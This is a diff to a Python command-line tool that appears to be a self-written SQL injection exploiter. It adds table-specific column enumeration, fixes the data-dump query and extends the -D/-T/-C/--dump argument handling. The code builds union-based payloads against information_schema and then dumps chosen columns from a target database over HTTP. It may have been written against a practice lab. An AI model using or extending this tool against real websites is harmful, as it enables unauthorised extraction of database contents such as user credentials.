@@ -4,6 +4,7 @@ import sys
 
 import requests
 from bs4 import BeautifulSoup
+
 import base
 
 
@@ -102,9 +103,10 @@ class error_injection(base.injection):
     #	print(sqli_url)
     #	sqli_url=base_url+''
 
-    def injection_columns(self, base_url):
+    def injection_columns(self, base_url, database, table):
         sqli_url = base_url.replace("null",
-                                    "(select group_concat(column_name) from information_schema.columns where table_name='users')")
+                                    "(select group_concat(column_name) from information_schema.columns where "
+                                    "table_name='%s')" % table)
         #    print(sqli_url)
         rep = requests.get(url=sqli_url)
         result = rep.text
@@ -115,15 +117,16 @@ class error_injection(base.injection):
                 print("[*]column name is: %s " % str(((tag.next).split(":", 1))[1]))
 
     def dump(self, base_url, database, table, column):
-        sqli_url = base_url.replace("null", "(select group_concat(%s) from $s.%s)" % {database, table, column})
+        sqli_url = base_url.replace("null", "(select group_concat(%s) from %s.%s)" % (column, database, table))
         #   print (sqli_url)
         rep = requests.get(url=sqli_url)
+        #        print(sqli_url)
         result = rep.text
         html_doc = BeautifulSoup(result, "lxml")
         #  print(html_doc)
         if "Your Login name:" in result:
             for tag in html_doc.find_all(color="#99FF00"):
-                print("[*]%s name is: %s " % (column, str(((tag.next).split(":", 1))[1])))
+                print("[*]%s name is: %s " % (column, str((tag.next.split(":", 1))[1])))
 
 
 def main():
@@ -132,7 +135,7 @@ def main():
     #   print(sys.argv)
     #     for i in sys.argv:
     if (len(sys.argv) == 1):
-        print("input string!!!!!!!!")
+        print("[!]input string!!!!!!!!")
     else:
         if sys.argv[1] == "-h":
             print("[*]**********************************************")
@@ -160,22 +163,23 @@ def main():
 
             #  print(result)
 
-        if result:
-            #         print(len(sys.argv))
-            union_number = injection.order_by()
-            union_url = injection.union_select_url(union_number)
-            # 获取第三个参数，注入出数据库名，表名，或者字段名，循环太多了，感觉自己好傻。
+            if result:
+                #         print(len(sys.argv))
+                union_number = injection.order_by()
+                union_url = injection.union_select_url(union_number)
+                # 获取第三个参数，注入出数据库名，表名，或者字段名，循环太多了，感觉自己好傻。
 
-            if len(sys.argv) > 3:
-                if sys.argv[3] == "-D" and (len(sys.argv) == 4):
-                    injection.injection_dbname(union_url)
-                elif sys.argv[3] == "-D" and sys.argv[5] == "-T" and len(sys.argv) < 8:
-                    injection.injection_tablename(union_url, sys.argv[4])
-                elif sys.argv[3] == "-D" and sys.argv[5] == "-T" and sys.argv[7] == "--dump" and sys.argv[4] != "" and \
-                        sys.argv[
-                            6] != "":
-                    print("[*]dump data....")
-                    injection.dump(union_url, sys.argv[4], sys.argv[6], sys.argv[8])
+                if len(sys.argv) > 3:
+                    if sys.argv[3] == "-D" and (len(sys.argv) == 4):
+                        injection.injection_dbname(union_url)
+                    elif sys.argv[3] == "-D" and sys.argv[5] == "-T" and len(sys.argv) < 7:
+                        injection.injection_tablename(union_url, sys.argv[4])
+                    elif sys.argv[3] == "-D" and sys.argv[5] == "-T" and sys.argv[7] == "-C" and len(sys.argv) < 9:
+                        #               print("[*]dump data....")
+                        injection.injection_columns(union_url, sys.argv[4], sys.argv[6])
+                    elif sys.argv[3] == "-D" and sys.argv[5] == "-T" and sys.argv[7] == "-C" and sys.argv[
+                        9] == "--dump":
+                        injection.dump(union_url, sys.argv[4], sys.argv[6], sys.argv[8])
 
         else:
 
